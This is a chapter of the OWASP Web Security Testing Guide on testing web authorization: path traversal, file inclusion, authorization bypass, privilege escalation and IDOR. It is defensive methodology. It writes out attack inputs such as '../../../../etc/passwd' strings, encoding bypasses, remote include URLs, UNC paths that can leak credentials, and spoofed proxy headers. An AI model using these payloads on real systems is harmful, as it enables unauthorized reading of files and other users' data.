# WSTG ATHZ — Authorization

OWASP Web Security Testing Guide v4.2. 4 test cases: WSTG-ATHZ-01, WSTG-ATHZ-02, WSTG-ATHZ-03, WSTG-ATHZ-04.

## Table of Contents

- [WSTG-ATHZ-01 — Testing Directory Traversal File Include](#wstg-athz-01)
- [WSTG-ATHZ-02 — Testing for Bypassing Authorization Schema](#wstg-athz-02)
- [WSTG-ATHZ-03 — Testing for Privilege Escalation](#wstg-athz-03)
- [WSTG-ATHZ-04 — Testing for Insecure Direct Object References](#wstg-athz-04)

---

## WSTG-ATHZ-01

**Testing Directory Traversal File Include**

Summary
Many web applications use and manage files as part of their daily operation. Using input validation methods that have
not been well designed or deployed, an aggressor could exploit the system in order to read or write files that are not
intended to be accessible. In particular situations, it could be possible to execute arbitrary code or system commands.
Traditionally, web servers and web applications implement authentication mechanisms to control access to files and
resources. Web servers try to confine users' files inside a "root directory" or "web document root", which represents a
physical directory on the file system. Users have to consider this directory as the base directory into the hierarchical
structure of the web application.
The definition of the privileges is made using Access Control Lists (ACL) which identify which users or groups are
supposed to be able to access, modify, or execute a specific file on the server. These mechanisms are designed to
prevent malicious users from accessing sensitive files (for example, the common /etc/passwd file on a UNIX-like
platform) or to avoid the execution of system commands.
Many web applications use server-side scripts to include different kinds of files. It is quite common to use this method to
manage images, templates, load static texts, and so on. Unfortunately, these applications expose security
vulnerabilities if input parameters (i.e., form parameters, cookie values) are not correctly validated.
In web servers and web applications, this kind of problem arises in path traversal/file include attacks. By exploiting this
kind of vulnerability, an attacker is able to read directories or files which they normally couldn't read, access data
outside the web document root, or include scripts and other kinds of files from external websites.
For the purpose of the OWASP Testing Guide, only the security threats related to web applications will be considered
and not threats to web servers (e.g., the infamous %5c escape code into Microsoft IIS web server). Further reading
suggestions will be provided in the references section for interested readers.
This kind of attack is also known as the dot-dot-slash attack ( ../ ), directory traversal, directory climbing,
or backtracking.
During an assessment, to discover path traversal and file include flaws, testers need to perform two different stages:
1. Input Vectors Enumeration (a systematic evaluation of each input vector)
2. Testing Techniques (a methodical evaluation of each attack technique used by an attacker to exploit the
vulnerability)

Test Objectives
Identify injection points that pertain to path traversal.
Assess bypassing techniques and identify the extent of path traversal.

How to Test
Black-Box Testing
Input Vectors Enumeration

In order to determine which part of the application is vulnerable to input validation bypassing, the tester needs to
enumerate all parts of the application that accept content from the user. This also includes HTTP GET and POST
queries and common options like file uploads and HTML forms.
Here are some examples of the checks to be performed at this stage:
Are there request parameters which could be used for file-related operations?
Are there unusual file extensions?
Are there interesting variable names?
http://example.com/getUserProfile.jsp?item=ikki.html
http://example.com/index.php?file=content
http://example.com/main.cgi?home=index.htm

Is it possible to identify cookies used by the web application for the dynamic generation of pages or templates?
Cookie: ID=d9ccd3f4f9f18cc1:TM=2166255468:LM=1162655568:S=3cFpqbJgMSSPKVMV:TEMPLATE=flower
Cookie: USER=1826cc8f:PSTYLE=GreenDotRed

Testing Techniques
The next stage of testing is analyzing the input validation functions present in the web application. Using the previous
example, the dynamic page called getUserProfile.jsp loads static information from a file and shows the content to
users. An attacker could insert the malicious string ../../../../etc/passwd to include the password hash file of a
Linux/UNIX system. Obviously, this kind of attack is possible only if the validation checkpoint fails; according to the file
system privileges, the web application itself must be able to read the file.
To successfully test for this flaw, the tester needs to have knowledge of the system being tested and the location of the
files being requested. There is no point requesting /etc/passwd from an IIS web server.

http://example.com/getUserProfile.jsp?item=../../../../etc/passwd

For the cookies example:

Cookie: USER=1826cc8f:PSTYLE=../../../../etc/passwd

It's also possible to include files and scripts located on external website:

http://example.com/index.php?file=http://www.owasp.org/malicioustxt

If protocols are accepted as arguments, as in the above example, it's also possible to probe the local filesystem this
way:

http://example.com/index.php?file=file:///etc/passwd

If protocols are accepted as arguments, as in the above examples, it's also possible to probe the local services and
nearby services:

http://example.com/index.php?file=http://localhost:8080
http://example.com/index.php?file=http://192.168.0.2:9080

The following example will demonstrate how it is possible to show the source code of a CGI component, without using
any path traversal characters.

http://example.com/main.cgi?home=main.cgi

The component called main.cgi is located in the same directory as the normal HTML static files used by the
application. In some cases the tester needs to encode the requests using special characters (like the . dot, %00 null,
etc.) in order to bypass file extension controls or to prevent script execution.
Tip: It's a common mistake by developers to not expect every form of encoding and therefore only do validation for
basic encoded content. If at first the test string isn't successful, try another encoding scheme.
Each operating system uses different characters as path separator:
Unix-like OS:
root directory: /
directory separator: /
Windows OS:
root directory: <drive letter>:
directory separator: \ or /
Classic macOS:
root directory: <drive letter>:
directory separator: :
We should take in to account the following character encoding mechanisms:
URL encoding and double URL encoding
%2e%2e%2f represents ../
%2e%2e/ represents ../
..%2f represents ../
%2e%2e%5c represents ..\
%2e%2e\ represents ..\
..%5c represents ..\
%252e%252e%255c represents ..\
..%255c represents ..\ and so on.

Unicode/UTF-8 Encoding (it only works in systems that are able to accept overlong UTF-8 sequences)
..%c0%af represents ../
..%c1%9c represents ..\

There are other OS and application framework specific considerations as well. For instance, Windows is flexible in its
parsing of file paths.
Windows shell: Appending any of the following to paths used in a shell command results in no difference in
function:
Angle brackets < and > at the end of the path
Double quotes (closed properly) at the end of the path
Extraneous current directory markers such as ./ or .\\
Extraneous parent directory markers with arbitrary items that may or may not exist:
file.txt
file.txt...
file.txt<spaces>

file.txt""""
file.txt<<<>>><
./././file.txt
nonexistant/../file.txt

Windows API: The following items are discarded when used in any shell command or API call where a string is
taken as a filename:
periods
spaces
Windows UNC Filepaths: Used to reference files on SMB shares. Sometimes, an application can be made to refer
to files on a remote UNC filepath. If so, the Windows SMB server may send stored credentials to the attacker, which
can be captured and cracked. These may also be used with a self-referential IP address or domain name to evade
filters, or used to access files on SMB shares inaccessible to the attacker, but accessible from the web server.
\\server_or_ip\path\to\file.abc
\\?\server_or_ip\path\to\file.abc

Windows NT Device Namespace: Used to refer to the Windows device namespace. Certain references will allow
access to file systems using a different path.
May be equivalent to a drive letter such as c:\ , or even a drive volume without an assigned letter:
\\.\GLOBALROOT\Device\HarddiskVolume1\

Refers to the first disc drive on the machine: \\.\CdRom0\

Gray-Box Testing
When the analysis is performed with a gray-box testing approach, testers have to follow the same methodology as in
black-box testing. However, since they can review the source code, it is possible to search the input vectors more easily
and accurately. During a source code review, they can use simple tools (such as the grep command) to search for one
or more common patterns within the application code: inclusion functions/methods, filesystem operations, and so on.
PHP: include(), include_once(), require(), require_once(), fopen(), readfile(), ...
JSP/Servlet: java.io.File(), java.io.FileReader(), ...
ASP: include file, include virtual, ...

Using online code search engines (e.g., Searchcode), it may also be possible to find path traversal flaws in Open
Source software published on the Internet.
For PHP, testers can use the following regex:

(include|require)(_once)?\s*['"(]?\s*\$_(GET|POST|COOKIE)

Using the gray-box testing method, it is possible to discover vulnerabilities that are usually harder to discover, or even
impossible to find during a standard black-box assessment.
Some web applications generate dynamic pages using values and parameters stored in a database. It may be possible
to insert specially crafted path traversal strings when the application adds data to the database. This kind of security
problem is difficult to discover due to the fact the parameters inside the inclusion functions seem internal and safe but
are not in reality.
Additionally, by reviewing the source code it is possible to analyze the functions that are supposed to handle invalid
input: some developers try to change invalid input to make it valid, avoiding warnings and errors. These functions are
usually prone to security flaws.
Consider a web application with these instructions:

filename = Request.QueryString("file");
Replace(filename, "/","\");
Replace(filename, "..\","");

Testing for the flaw is achieved by:

file=....//....//boot.ini
file=....\\....\\boot.ini
file= ..\..\boot.ini

Tools
DotDotPwn - The Directory Traversal Fuzzer
Path Traversal Fuzz Strings (from WFuzz Tool)
OWASP ZAP
Burp Suite
Enconding/Decoding tools
String searcher "grep"
DirBuster

References
Whitepapers
phpBB Attachment Mod Directory Traversal HTTP POST Injection
Windows File Pseudonyms: Pwnage and Poetry

---

## WSTG-ATHZ-02

**Testing for Bypassing Authorization Schema**

Summary
This kind of test focuses on verifying how the authorization schema has been implemented for each role or privilege to
get access to reserved functions and resources.
For every specific role the tester holds during the assessment and for every function and request that the application
executes during the post-authentication phase, it is necessary to verify:
Is it possible to access that resource even if the user is not authenticated?
Is it possible to access that resource after the log-out?
Is it possible to access functions and resources that should be accessible to a user that holds a different role or
privilege?
Try to access the application as an administrative user and track all the administrative functions.
Is it possible to access administrative functions if the tester is logged in as a non-admin user?
Is it possible to use these administrative functions as a user with a different role and for whom that action should be
denied?

Test Objectives
Assess if horizontal or vertical access is possible.

How to Test
Access resources and conduct operations horizontally.
Access resources and conduct operations vertically.

Testing for Horizontal Bypassing Authorization Schema
For every function, specific role, or request that the application executes, it is necessary to verify:
Is it possible to access resources that should be accessible to a user that holds a different identity with the same
role or privilege?
Is it possible to operate functions on resources that should be accessible to a user that holds a different identity?
For each role:
1. Register or generate two users with identical privileges.
2. Establish and keep two different sessions active (one for each user).
3. For every request, change the relevant parameters and the session identifier from token one to token two and
diagnose the responses for each token.
4. An application will be considered vulnerable if the responses are the same, contain same private data or indicate
successful operation on other users' resource or data.
For example, suppose that the viewSettings function is part of every account menu of the application with the same
role,
and
it
is
possible
to
access
it
by
requesting
the
following
URL:

https://www.example.com/account/viewSettings . Then, the following HTTP request is generated when calling the
viewSettings function:

POST /account/viewSettings HTTP/1.1
Host: www.example.com
[other HTTP headers]
Cookie: SessionID=USER_SESSION
username=example_user

Valid and legitimate response:

HTTP1.1 200 OK
[other HTTP headers]
{
"username": "example_user",
"email": "example@email.com",
"address": "Example Address"
}

The attacker may try and execute that request with the same username parameter:

POST /account/viewCCpincode HTTP/1.1
Host: www.example.com
[other HTTP headers]
Cookie: SessionID=ATTACKER_SESSION
username=example_user

If the attacker's response contain the data of the example_user , then the application is vulnerable for lateral movement
attacks, where a user can read or write other user's data.

Testing for Vertical Bypassing Authorization Schema
A vertical authorization bypass is specific to the case that an attacker obtains a role higher than their own. Testing for
this bypass focuses on verifying how the vertical authorization schema has been implemented for each role. For every
function, page, specific role, or request that the application executes, it is necessary to verify if it is possible to:
Access resources that should be accessible only to a higher role user.
Operate functions on resources that should be operative only by a user that holds a higher or specific role identity.
For each role:
1. Register a user.
2. Establish and maintain two different sessions based on the two different roles.
3. For every request, change the session identifier from the original to another role's session identifier and evaluate
the responses for each.
4. An application will be considered vulnerable if the weaker privileged session contains the same data, or indicate
successful operations on higher privileged functions.
Banking Site Roles Scenario
The following table illustrates the system roles on a banking site. Each role binds with specific permissions for the event
menu functionality:

ROLE

PERMISSION

ADDITIONAL PERMISSION

Administrator

Full Control

Delete

Manager

Modify, Add, Read

Add

Staff

Read, Modify

Modify

Customer

Read Only

The application will be considered vulnerable if the:
1. Customer could operate administrator, manager or staff functions;
2. Staff user could operate manager or administrator functions;
3. Manager could operate administrator functions.
Suppose that the deleteEvent function is part of the administrator account menu of the application, and it is possible
to access it by requesting the following URL: https://www.example.com/account/deleteEvent . Then, the following
HTTP request is generated when calling the deleteEvent function:

POST /account/deleteEvent HTTP/1.1
Host: www.example.com
[other HTTP headers]
Cookie: SessionID=ADMINISTRATOR_USER_SESSION
EventID=1000001

The valid response:

HTTP/1.1 200 OK
[other HTTP headers]
{"message": "Event was deleted"}

The attacker may try and execute the same request:

POST /account/deleteEvent HTTP/1.1
Host: www.example.com
[other HTTP headers]
Cookie: SessionID=CUSTOMER_USER_SESSION
EventID=1000002

If the response of the attacker's request contains the same data {"message": "Event was deleted"} the application is
vulnerable.
Administrator Page Access
Suppose that the administrator menu is part of the administrator account.
The application will be considered vulnerable if any role other than administrator could access the administrator menu.
Sometimes, developers perform authorization validation at the GUI level only, and leave the functions without
authorization validation, thus potentially resulting in a vulnerability.

Testing for Access to Administrative Functions

For example, suppose that the addUser function is part of the administrative menu of the application, and it is possible
to access it by requesting the following URL https://www.example.com/admin/addUser .
Then, the following HTTP request is generated when calling the addUser function:

POST /admin/addUser HTTP/1.1
Host: www.example.com
[...]
userID=fakeuser&role=3&group=grp001

Further questions or considerations would go in the following direction:
What happens if a non-administrative user tries to execute that request?
Will the user be created?
If so, can the new user use their privileges?

Testing for Access to Resources Assigned to a Different Role
Various applications setup resource controls based on user roles. Let's take an example resumes or CVs (curriculum
vitae) uploaded on a careers form to an S3 bucket.
As a normal user, try accessing the location of those files. If you are able to retrieve them, modify them, or delete them,
then the application is vulnerable.

Testing for Special Request Header Handling
Some applications support non-standard headers such as X-Original-URL or X-Rewrite-URL in order to allow
overriding the target URL in requests with the one specified in the header value.
This behavior can be leveraged in a situation in which the application is behind a component that applies access
control restriction based on the request URL.
The kind of access control restriction based on the request URL can be, for example, blocking access from Internet to
an administration console exposed on /console or /admin .
To detect the support for the header X-Original-URL or X-Rewrite-URL , the following steps can be applied.
1. Send a Normal Request without Any X-Original-Url or X-Rewrite-Url Header
GET / HTTP/1.1
Host: www.example.com
[...]

2. Send a Request with an X-Original-Url Header Pointing to a Non-Existing Resource
GET / HTTP/1.1
Host: www.example.com
X-Original-URL: /donotexist1
[...]

3. Send a Request with an X-Rewrite-Url Header Pointing to a Non-Existing Resource
GET / HTTP/1.1
Host: www.example.com
X-Rewrite-URL: /donotexist2
[...]

If the response for either request contains markers that the resource was not found, this indicates that the application
supports the special request headers. These markers may include the HTTP response status code 404, or a "resource
not found" message in the response body.
Once the support for the header X-Original-URL or X-Rewrite-URL was validated then the tentative of bypass
against the access control restriction can be leveraged by sending the expected request to the application but
specifying a URL "allowed" by the front-end component as the main request URL and specifying the real target URL in
the X-Original-URL or X-Rewrite-URL header depending on the one supported. If both are supported then try one
after the other to verify for which header the bypass is effective.
4. Other Headers to Consider
Often admin panels or administrative related bits of functionality are only accessible to clients on local networks,
therefore it may be possible to abuse various proxy or forwarding related HTTP headers to gain access. Some headers
and values to test with are:
Headers:
X-Forwarded-For
X-Forward-For
X-Remote-IP
X-Originating-IP
X-Remote-Addr
X-Client-IP

Values
127.0.0.1 (or anything in the 127.0.0.0/8 or ::1/128 address spaces)
localhost

Any RFC1918 address:
10.0.0.0/8
172.16.0.0/12
192.168.0.0/16

Link local addresses: 169.254.0.0/16
Note: Including a port element along with the address or hostname may also help bypass edge protections such as
web application firewalls, etc. For example: 127.0.0.4:80 , 127.0.0.4:443 , 127.0.0.4:43982

Remediation
Employ the least privilege principles on the users, roles, and resources to ensure that no unauthorized access occurs.

Tools
OWASP Zed Attack Proxy (ZAP)
ZAP add-on: Access Control Testing
Port Swigger Burp Suite
Burp extension: AuthMatrix
Burp extension: Autorize

References
OWASP Application Security Verification Standard 4.0.1, v4.0.1-1, v4.0.1-4, v4.0.1-9, v4.0.1-16

---

## WSTG-ATHZ-03

**Testing for Privilege Escalation**

Summary
This section describes the issue of escalating privileges from one stage to another. During this phase, the tester should
verify that it is not possible for a user to modify their privileges or roles inside the application in ways that could allow
privilege escalation attacks.
Privilege escalation occurs when a user gets access to more resources or functionality than they are normally allowed,
and such elevation or changes should have been prevented by the application. This is usually caused by a flaw in the
application. The result is that the application performs actions with more privileges than those intended by the
developer or system administrator.
The degree of escalation depends on what privileges the attacker is authorized to possess, and what privileges can be
obtained in a successful exploit. For example, a programming error that allows a user to gain extra privilege after
successful authentication limits the degree of escalation, because the user is already authorized to hold some
privilege. Likewise, a remote attacker gaining superuser privilege without any authentication presents a greater degree
of escalation.
Usually, people refer to vertical escalation when it is possible to access resources granted to more privileged accounts
(e.g., acquiring administrative privileges for the application), and to horizontal escalation when it is possible to access
resources granted to a similarly configured account (e.g., in an online banking application, accessing information
related to a different user).

Test Objectives
Identify injection points related to privilege manipulation.
Fuzz or otherwise attempt to bypass security measures.

How to Test
Testing for Role/Privilege Manipulation
In every portion of the application where a user can create information in the database (e.g., making a payment, adding
a contact, or sending a message), can receive information (statement of account, order details, etc.), or delete
information (drop users, messages, etc.), it is necessary to record that functionality. The tester should try to access such
functions as another user in order to verify if it is possible to access a function that should not be permitted by the user's
role/privilege (but might be permitted as another user).
Manipulation of User Group
For example: The following HTTP POST allows the user that belongs to grp001 to access order #0001:

POST /user/viewOrder.jsp HTTP/1.1
Host: www.example.com
...
groupID=grp001&orderID=0001

Verify if a user that does not belong to grp001 can modify the value of the parameters groupID and orderID to gain
access to that privileged data.

Manipulation of User Profile
For example: The following server's answer shows a hidden field in the HTML returned to the user after a successful
authentication.

HTTP/1.1 200 OK
Server: Netscape-Enterprise/6.0
Date: Wed, 1 Apr 2006 13:51:20 GMT
Set-Cookie: USER=aW78ryrGrTWs4MnOd32Fs51yDqp; path=/; domain=www.example.com
Set-Cookie: SESSION=k+KmKeHXTgDi1J5fT7Zz; path=/; domain= www.example.com
Cache-Control: no-cache
Pragma: No-cache
Content-length: 247
Content-Type: text/html
Expires: Thu, 01 Jan 1970 00:00:00 GMT
Connection: close
<form name="autoriz" method="POST" action = "visual.jsp">
<input type="hidden" name="profile" value="SysAdmin">\
<body onload="document.forms.autoriz.submit()">
</td>
</tr>

What if the tester modifies the value of the variable profile to SysAdmin ? Is it possible to become administrator?
Manipulation of Condition Value
For example: In an environment where the server sends an error message contained as a value in a specific parameter
in a set of answer codes, as the following:

@0`1`3`3``0`UC`1`Status`OK`SEC`5`1`0`ResultSet`0`PVValid`-1`0`0` Notifications`0`0`3`Command
Manager`0`0`0` StateToolsBar`0`0`0`
StateExecToolBar`0`0`0`FlagsToolBar`0

The server gives an implicit trust to the user. It believes that the user will answer with the above message closing the
session.
In this condition, verify that it is not possible to escalate privileges by modifying the parameter values. In this particular
example, by modifying the PVValid value from -1 to 0 (no error conditions), it may be possible to authenticate as
administrator to the server.
Manipulation of IP Address
Some websites limit access or count the number of failed login attempts based on IP address.
For example:

X-Forwarded-For: 8.1.1.1

In this case, if the website uses the value of X-forwarded-For as client IP address, tester may change the IP value of
the X-forwarded-For HTTP header to workaround the IP source identification.

URL Traversal
Try to traverse the website and check if some of pages that may miss the authorization check.
For example:

/../.././userInfo.html

WhiteBox
If the URL authorization check is only done by partial URL match, then it's likely testers or hackers may workaround the
authorization by URL encoding techniques.
For example:

startswith(), endswith(), contains(), indexOf()

Weak SessionID
Weak Session ID has algorithm may be vulnerable to brute Force attack. For example, one website is using
MD5(Password + UserID) as sessionID. Then, testers may guess or generate the sessionID for other users.

References
Whitepapers
Wikipedia - Privilege Escalation

Tools
OWASP Zed Attack Proxy (ZAP)

---

## WSTG-ATHZ-04

**Testing for Insecure Direct Object References**

Summary
Insecure Direct Object References (IDOR) occur when an application provides direct access to objects based on usersupplied input. As a result of this vulnerability attackers can bypass authorization and access resources in the system
directly, for example database records or files. Insecure Direct Object References allow attackers to bypass
authorization and access resources directly by modifying the value of a parameter used to directly point to an object.
Such resources can be database entries belonging to other users, files in the system, and more. This is caused by the
fact that the application takes user supplied input and uses it to retrieve an object without performing sufficient
authorization checks.

Test Objectives
Identify points where object references may occur.
Assess the access control measures and if they're vulnerable to IDOR.

How to Test
To test for this vulnerability the tester first needs to map out all locations in the application where user input is used to
reference objects directly. For example, locations where user input is used to access a database row, a file, application
pages and more. Next the tester should modify the value of the parameter used to reference objects and assess
whether it is possible to retrieve objects belonging to other users or otherwise bypass authorization.
The best way to test for direct object references would be by having at least two (often more) users to cover different
owned objects and functions. For example two users each having access to different objects (such as purchase
information, private messages, etc.), and (if relevant) users with different privileges (for example administrator users) to
see whether there are direct references to application functionality. By having multiple users the tester saves valuable
testing time in guessing different object names as he can attempt to access objects that belong to the other user.
Below are several typical scenarios for this vulnerability and the methods to test for each:

The Value of a Parameter Is Used Directly to Retrieve a Database Record
Sample request:

http://foo.bar/somepage?invoice=12345

In this case, the value of the invoice parameter is used as an index in an invoices table in the database. The application
takes the value of this parameter and uses it in a query to the database. The application then returns the invoice
information to the user.
Since the value of invoice goes directly into the query, by modifying the value of the parameter it is possible to retrieve
any invoice object, regardless of the user to whom the invoice belongs. To test for this case the tester should obtain the
identifier of an invoice belonging to a different test user (ensuring he is not supposed to view this information per
application business logic), and then check whether it is possible to access objects without authorization.

The Value of a Parameter Is Used Directly to Perform an Operation in the System
Sample request:

http://foo.bar/changepassword?user=someuser

In this case, the value of the user parameter is used to tell the application for which user it should change the
password. In many cases this step will be a part of a wizard, or a multi-step operation. In the first step the application
will get a request stating for which user's password is to be changed, and in the next step the user will provide a new
password (without asking for the current one).
The user parameter is used to directly reference the object of the user for whom the password change operation will
be performed. To test for this case the tester should attempt to provide a different test username than the one currently
logged in, and check whether it is possible to modify the password of another user.

The Value of a Parameter Is Used Directly to Retrieve a File System Resource
Sample request:

http://foo.bar/showImage?img=img00011

In this case, the value of the file parameter is used to tell the application what file the user intends to retrieve. By
providing the name or identifier of a different file (for example file=image00012.jpg) the attacker will be able to retrieve
objects belonging to other users.
To test for this case, the tester should obtain a reference the user is not supposed to be able to access and attempt to
access it by using it as the value of file parameter. Note: This vulnerability is often exploited in conjunction with a
directory/path traversal vulnerability (see Testing for Path Traversal)

The Value of a Parameter Is Used Directly to Access Application Functionality
Sample request:

http://foo.bar/accessPage?menuitem=12

In this case, the value of the menuitem parameter is used to tell the application which menu item (and therefore which
application functionality) the user is attempting to access. Assume the user is supposed to be restricted and therefore
has links available only to access to menu items 1, 2 and 3. By modifying the value of menuitem parameter it is
possible to bypass authorization and access additional application functionality. To test for this case the tester identifies
a location where application functionality is determined by reference to a menu item, maps the values of menu items
the given test user can access, and then attempts other menu items.
In the above examples the modification of a single parameter is sufficient. However, sometimes the object reference
may be split between more than one parameter, and testing should be adjusted accordingly.

References
Top 10 2013-A4-Insecure Direct Object References

4.6 Session Management Testing
4.6.1 Testing for Session Management Schema
4.6.2 Testing for Cookies Attributes
4.6.3 Testing for Session Fixation
4.6.4 Testing for Exposed Session Variables
4.6.5 Testing for Cross Site Request Forgery
4.6.6 Testing for Logout Functionality
4.6.7 Testing Session Timeout
4.6.8 Testing for Session Puzzling
4.6.9 Testing for Session Hijacking

---

